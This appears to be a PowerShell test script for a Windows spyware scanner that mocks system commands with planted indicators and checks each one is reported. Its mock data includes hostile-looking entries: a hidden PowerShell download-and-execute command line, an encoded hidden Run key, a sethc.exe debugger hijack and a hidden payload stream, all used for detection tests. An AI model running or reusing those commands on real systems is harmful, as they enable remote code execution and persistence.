<#
    Runs the Windows checks of powershell/scs.ps1 against synthetic data, on any system with PowerShell 7
    (Windows, Linux or macOS). Every Windows-only command is replaced by a mock that returns a planted,
    harmless test situation; the script then verifies that each planted problem is reported.
    Exit code 0 = all expectations met.

        pwsh -NoProfile -File tests/windows-mock.ps1
#>
$ErrorActionPreference = 'Stop'
# inside the repository (not %TEMP%, which can be an 8.3 short path on Windows runners)
$root = Join-Path $PSScriptRoot ('.mock-' + [IO.Path]::GetRandomFileName())
New-Item -ItemType Directory -Force -Path $root | Out-Null
$env:SCS_HOME = Join-Path $root 'home'
$env:SCS_PS_NO_MAIN = '1'
$scs = [IO.Path]::Combine($PSScriptRoot, '..', 'powershell', 'scs.ps1')
. $scs
$ErrorActionPreference = 'Continue'

$Script:IsWin = $true
$NoColor = $true
$Mode = 'Full'

function New-Dir([string]$p) { New-Item -ItemType Directory -Force -Path $p | Out-Null; return $p }
$homeDir = New-Dir $env:SCS_HOME
$env:APPDATA = New-Dir (Join-Path $root 'AppData/Roaming')
$env:LOCALAPPDATA = New-Dir (Join-Path $root 'AppData/Local')
$env:ProgramData = New-Dir (Join-Path $root 'ProgramData')
$env:SystemRoot = New-Dir (Join-Path $root 'Windows')
$env:TEMP = New-Dir (Join-Path $root 'Temp')
$Script:IocDir = New-Dir (Join-Path $root 'no-feeds')   # no downloaded lists: only the planted test indicators

# ---------------------------------------------------------------- planted test indicators (documentation ranges / .example)
Import-Indicators
Add-IocValue 'domain' 'evil-test.example' 'Mock feed'
Add-IocValue 'ipv4' '203.0.113.66' 'Mock feed'
Add-IocValue 'process' 'evilspy.exe' 'Mock feed'
$malware = Join-Path $env:TEMP 'invoice.pdf.exe'
[IO.File]::WriteAllText($malware, 'SCS mock malware sample - harmless text')
Add-IocValue 'sha256' ((Get-FileHash -LiteralPath $malware -Algorithm SHA256).Hash.ToLower()) 'Mock feed'

# ---------------------------------------------------------------- files: hosts, startup folder, browser history, thumbnails
$etc = New-Dir ([IO.Path]::Combine($env:SystemRoot, 'System32', 'drivers', 'etc'))
[IO.File]::WriteAllText((Join-Path $etc 'hosts'), "127.0.0.1 localhost`n203.0.113.5 www.mybank.example`n")
$hosts = Join-Path $etc 'hosts'
$chrome = New-Dir ([IO.Path]::Combine($env:LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default'))
[IO.File]::WriteAllText((Join-Path $chrome 'History'), 'SQLite format 3 ... https://cdn.evil-test.example/track?id=1 ... https://www.wikipedia.org/ ...')
$explorer = New-Dir ([IO.Path]::Combine($env:LOCALAPPDATA, 'Microsoft', 'Windows', 'Explorer'))
[IO.File]::WriteAllBytes((Join-Path $explorer 'thumbcache_256.db'), (New-Object byte[] 4096))

# ---------------------------------------------------------------- registry
$Global:MockReg = @{
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'                     = @{ OneDrive = '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background'; Updater = 'powershell.exe -w hidden -enc SQBFAFgA' }
    'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'             = @{ Shell = 'explorer.exe, C:\Users\Public\helper.exe'; Userinit = 'C:\Windows\system32\userinit.exe,' }
    'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' = @{ Debugger = 'C:\Windows\System32\cmd.exe' }
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'       = @{ ProxyEnable = 1; ProxyServer = '203.0.113.66:8080' }
}
$Global:MockRegChildren = @{
    'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' = @([pscustomobject]@{ PSChildName = 'sethc.exe'; PSPath = 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' })
}
# Windows program files that "exist" on the mocked computer
$Global:MockFiles = @('C:\Windows\System32\spoolsv.exe', 'C:\Program Files (x86)\Google\Update\GoogleUpdate.exe', 'C:\Program Files\Microsoft OneDrive\OneDrive.exe',
    'C:\Users\Max\AppData\Roaming\SyncHelper\sync.exe', 'C:\ProgramData\WinUpd\winupd.exe', 'C:\Program Files\NewThing\newthing.exe')
$Global:MockCerts = @([pscustomobject]@{ Subject = 'CN=Superfish, Inc., O=Superfish, Inc., L=Palo Alto, S=CA, C=US' }, [pscustomobject]@{ Subject = 'CN=DigiCert Global Root G2, OU=www.digicert.com, O=DigiCert Inc, C=US' })

function Test-Path {
    [CmdletBinding()]
    param([Parameter(Position = 0)][string[]]$Path, [string[]]$LiteralPath, [Microsoft.PowerShell.Commands.TestPathType]$PathType)
    $p = @(@($Path) + @($LiteralPath) | Where-Object { $_ })[0]
    if ($p -match '^(HKCU|HKLM):') { return $Global:MockReg.ContainsKey($p) -or $Global:MockRegChildren.ContainsKey($p) }
    # fake Windows program paths (but not the real temp folder of this test on a Windows runner)
    if ($p -match '^[A-Za-z]:\\' -and -not $p.StartsWith($root, [StringComparison]::OrdinalIgnoreCase)) { return $Global:MockFiles -contains $p }
    Microsoft.PowerShell.Management\Test-Path @PSBoundParameters
}
function Get-ItemProperty {
    [CmdletBinding()]
    param([Parameter(Position = 0)][string[]]$Path, [string[]]$LiteralPath, [Parameter(Position = 1)][string[]]$Name)
    $p = @(@($Path) + @($LiteralPath) | Where-Object { $_ })[0]
    if ($p -match '^(HKCU|HKLM):') { if ($Global:MockReg.ContainsKey($p)) { return [pscustomobject]$Global:MockReg[$p] }; return $null }
    Microsoft.PowerShell.Management\Get-ItemProperty @PSBoundParameters
}
function Get-ChildItem {
    [CmdletBinding()]
    param([Parameter(Position = 0)][string[]]$Path, [string[]]$LiteralPath, [string]$Filter, [switch]$Recurse, [uint32]$Depth, [switch]$File, [switch]$Directory, [switch]$Force)
    $p = @(@($Path) + @($LiteralPath) | Where-Object { $_ })[0]
    if ($p -match '^Cert:') { return $Global:MockCerts }
    if ($p -match '^(HKCU|HKLM):') { return $Global:MockRegChildren[$p] }
    Microsoft.PowerShell.Management\Get-ChildItem @PSBoundParameters
}

# ---------------------------------------------------------------- Windows-only commands
function Test-Admin { return $true }
function Get-ScheduledTask {
    return @(
        [pscustomobject]@{ TaskPath = '\Microsoft\Windows\Defrag\'; TaskName = 'ScheduledDefrag'; State = 'Ready'; Actions = @([pscustomobject]@{ Execute = '%windir%\system32\defrag.exe'; Arguments = '-c -h -o' }) },
        [pscustomobject]@{ TaskPath = '\'; TaskName = 'GoogleUpdateTaskMachineCore'; State = 'Ready'; Actions = @([pscustomobject]@{ Execute = 'C:\Program Files (x86)\Google\Update\GoogleUpdate.exe'; Arguments = '/c' }) },
        [pscustomobject]@{ TaskPath = '\'; TaskName = 'SyncHelper'; State = 'Ready'; Actions = @([pscustomobject]@{ Execute = 'C:\Users\Max\AppData\Roaming\SyncHelper\sync.exe'; Arguments = '' }) }
    )
}
function Get-CimInstance {
    param([Parameter(Position = 0)][string]$ClassName)
    if ($ClassName -eq 'Win32_Service') {
        return @(
            [pscustomobject]@{ Name = 'Spooler'; DisplayName = 'Print Spooler'; PathName = 'C:\Windows\System32\spoolsv.exe'; StartMode = 'Auto' },
            [pscustomobject]@{ Name = 'Dnscache'; DisplayName = 'DNS Client'; PathName = 'C:\Windows\system32\svchost.exe -k NetworkService'; StartMode = 'Auto' },
            [pscustomobject]@{ Name = 'WinUpdSvc'; DisplayName = 'Windows Update Helper'; PathName = 'C:\ProgramData\WinUpd\winupd.exe'; StartMode = 'Auto' }
        )
    }
    if ($ClassName -eq 'Win32_Process') {
        return @(
            [pscustomobject]@{ ProcessId = 4; Name = 'System'; ExecutablePath = ''; CommandLine = '' },
            [pscustomobject]@{ ProcessId = 1200; Name = 'explorer.exe'; ExecutablePath = 'C:\Windows\explorer.exe'; CommandLine = 'C:\Windows\Explorer.EXE' },
            [pscustomobject]@{ ProcessId = 2200; Name = 'evilspy.exe'; ExecutablePath = 'C:\Users\Max\AppData\Local\evilspy.exe'; CommandLine = 'evilspy.exe' },
            [pscustomobject]@{ ProcessId = 2300; Name = 'AnyDesk.exe'; ExecutablePath = 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe'; CommandLine = '"AnyDesk.exe" --service' },
            [pscustomobject]@{ ProcessId = 2400; Name = 'powershell.exe'; ExecutablePath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; CommandLine = 'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''http://203.0.113.9/a'')"' }
        )
    }
    throw "unexpected CIM class $ClassName"
}
function Get-AuthenticodeSignature {
    param([string]$LiteralPath)
    $st = 'Valid'; if ($LiteralPath -match 'AppData') { $st = 'NotSigned' }
    return [pscustomobject]@{ Status = $st }
}
function Get-NetAdapter { return @([pscustomobject]@{ Name = 'Ethernet'; InterfaceDescription = 'Intel(R) Ethernet Connection'; Status = 'Up' }, [pscustomobject]@{ Name = 'NordLynx'; InterfaceDescription = 'NordLynx Tunnel'; Status = 'Up' }) }
function Get-VpnConnection {
    param([switch]$AllUserConnection)
    if ($AllUserConnection) { return @() }
    return @([pscustomobject]@{ Name = 'Work VPN'; ServerAddress = 'gw.evil-test.example'; TunnelType = 'Ikev2'; ConnectionStatus = 'Disconnected' })
}
function Get-DnsClientServerAddress {
    return @(
        [pscustomobject]@{ InterfaceAlias = 'Ethernet'; ServerAddresses = @('192.168.1.1', '9.9.9.9', '45.77.1.2') },
        [pscustomobject]@{ InterfaceAlias = 'NordLynx'; ServerAddresses = @('103.86.96.100') },
        [pscustomobject]@{ InterfaceAlias = 'Loopback Pseudo-Interface 1'; ServerAddresses = @('fec0:0:0:ffff::1') }
    )
}
function Get-DnsClientCache { return @([pscustomobject]@{ Entry = 'www.wikipedia.org' }, [pscustomobject]@{ Entry = 'cdn.evil-test.example' }) }
function Get-WinEvent {
    param($FilterHashtable, $MaxEvents)
    return @([pscustomobject]@{ Properties = @([pscustomobject]@{ Value = 'login.evil-test.example' }) }, [pscustomobject]@{ Properties = @([pscustomobject]@{ Value = 'example.org' }) })
}
function Get-NetTCPConnection { param($State) return @([pscustomobject]@{ RemoteAddress = '93.184.215.14' }, [pscustomobject]@{ RemoteAddress = '203.0.113.66' }) }
function Get-MpComputerStatus { return [pscustomobject]@{ AntivirusEnabled = $true; RealTimeProtectionEnabled = $false; AntivirusSignatureAge = 1; IsTamperProtected = $true } }
function Get-MpPreference { return [pscustomobject]@{ ExclusionPath = @('C:\Users\Max\AppData\Local\Temp'); ExclusionProcess = @(); ExclusionExtension = @() } }
function Get-RecycleBinCount { return 3 }
function Get-AltStreams($Dirs) { return @([pscustomobject]@{ FileName = 'C:\Users\Max\Documents\notes.txt'; Stream = 'payload.exe'; Length = 73802 }) }

# ---------------------------------------------------------------- run 1
$meta = Invoke-Scan
$first = @($Script:Findings.ToArray())

$expect = @(
    @('WARNING', 'Autostart', 'Suspicious autostart: Updater'),
    @('WARNING', 'Autostart', 'Winlogon Shell modified'),
    @('WARNING', 'Autostart', 'Program redirect (Debugger) for sethc.exe'),
    @('WARNING', 'Scheduled tasks', 'Suspicious autostart: \SyncHelper'),
    @('WARNING', 'Services', 'Suspicious autostart: Windows Update Helper'),
    @('DETECTED', 'Processes', 'Running process matches spyware: evilspy.exe'),
    @('WARNING', 'Processes', 'Suspicious command line: powershell.exe'),
    @('WARNING', 'Remote access', 'Remote access program running: AnyDesk'),
    @('WARNING', 'Signatures', 'without a valid signature'),
    @('INFO', 'VPN', 'VPN active: NordLynx'),
    @('DETECTED', 'VPN', 'VPN server is a known spyware address: gw.evil-test.example'),
    @('DETECTED', 'Proxy', 'System proxy points to a known spyware address'),
    @('WARNING', 'DNS servers', 'Unknown DNS server: 45.77.1.2'),
    @('WARNING', 'Root certificates', 'Superfish'),
    @('DETECTED', 'DNS', 'Known spyware address: evil-test.example'),
    @('DETECTED', 'Network', 'Connection to known spyware IP 203.0.113.66'),
    @('WARNING', 'Defender', 'real-time protection off'),
    @('WARNING', 'Defender', 'exclusion'),
    @('INFO', 'Recycle Bin', '3 items in the Recycle Bin'),
    @('WARNING', 'Network', 'hosts file contains 1 redirect'),
    @('DETECTED', 'Browser', 'Known spyware address: evil-test.example'),
    @('DETECTED', 'Files', 'Known malware: invoice.pdf.exe'),
    @('INFO', 'Thumbnail caches', 'Windows thumbnail cache'),
    @('WARNING', 'Hidden data streams', '1 hidden data stream'),
    @('INFO', 'Changes', 'Baseline created')
)
$unexpected = @(
    @('Services', 'Print Spooler'),
    @('DNS servers', 'Unknown DNS server: 9.9.9.9'),
    @('DNS servers', 'Unknown DNS server: 103.86.96.100'),
    @('Scheduled tasks', 'GoogleUpdate'),
    @('Root certificates', 'DigiCert')
)
$failed = 0
foreach ($e in $expect) {
    $hit = $first | Where-Object { $_.sev -eq $e[0] -and $_.area -eq $e[1] -and $_.title.Contains($e[2]) }
    if (-not $hit) { $failed++; Write-Host "MISSING   [$($e[0])] $($e[1]): $($e[2])" }
}
foreach ($u in $unexpected) {
    $hit = $first | Where-Object { ($_.sev -eq 'WARNING' -or $_.sev -eq 'DETECTED') -and $_.area -eq $u[0] -and $_.title.Contains($u[1]) }
    if ($hit) { $failed++; Write-Host "UNEXPECTED $($u[0]): $($u[1])" }
}
$skipped = $first | Where-Object { $_.sev -eq 'NOT CHECKED' -and $_.title -eq 'Check failed' }
foreach ($s in $skipped) { $failed++; Write-Host "CHECK FAILED $($s.area): $($s.detail)" }

# ---------------------------------------------------------------- reports
$html = Join-Path $root 'report.html'; $json = Join-Path $root 'report.json'
Save-HtmlReport $html $meta
Save-JsonReport $json $meta
$doc = (Get-Content -LiteralPath $json -Raw) | ConvertFrom-Json
if ($doc.findings.Count -ne $first.Count) { $failed++; Write-Host 'JSON report incomplete' }
if (-not ((Get-Content -LiteralPath $html -Raw).Contains('Superfish'))) { $failed++; Write-Host 'HTML report incomplete' }

# ---------------------------------------------------------------- run 2: change detection
$Script:Findings.Clear(); $Script:Snap = @{}
$Global:MockReg['HKCU:\Software\Microsoft\Windows\CurrentVersion\Run']['NewThing'] = 'C:\Program Files\NewThing\newthing.exe'
$null = Invoke-Scan
$change = $Script:Findings | Where-Object { $_.area -eq 'Changes' }
if (-not ($change | Where-Object { $_.sev -eq 'WARNING' -and $_.title.StartsWith('1 new autostart entry since') -and $_.detail.Contains('NewThing') })) { $failed++; Write-Host "MISSING   change detection: $($change.title)" }

# ---------------------------------------------------------------- quarantine round trip
$qid = Move-ToQuarantine $malware 'mock test'
if (Test-Path -LiteralPath $malware) { $failed++; Write-Host 'quarantine: file still present' }
$back = Restore-FromQuarantine $qid
if (-not (Microsoft.PowerShell.Management\Test-Path -LiteralPath $back)) { $failed++; Write-Host 'quarantine: restore failed' }
try { Restore-FromQuarantine '..' | Out-Null; $failed++; Write-Host 'quarantine: invalid ID accepted' } catch { Write-Verbose 'invalid ID refused as expected' }

Remove-Item -LiteralPath $root -Recurse -Force -ErrorAction SilentlyContinue
if ($failed) { Write-Host "windows-mock: $failed problem(s)"; exit 1 }
Write-Host "windows-mock: all $($expect.Count + $unexpected.Count + 4) expectations met"
exit 0
